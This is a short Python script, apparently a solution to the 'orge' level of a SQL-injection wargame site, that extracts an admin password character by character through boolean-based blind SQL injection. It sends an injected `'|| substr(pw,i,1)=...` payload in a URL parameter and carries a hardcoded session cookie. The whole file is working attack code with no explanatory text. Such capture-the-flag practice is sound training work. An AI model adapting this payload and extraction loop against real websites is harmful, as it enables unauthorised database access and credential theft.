import requests as req
pwd=""
cookies = {'PHPSESSID':'5cbi4j1nqp56sico0e7i70lddb'}
string = "1234567890abcdefghijklmnopqrstuvwxyz"
for i in range(1,9):
    for j in string:
        url = f"https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw='|| substr(pw,{i},1)='{j}' -- "
        res = req.get(url=url, cookies=cookies)
        if 'Hello admin' in res.text:
            pwd += j

print(pwd)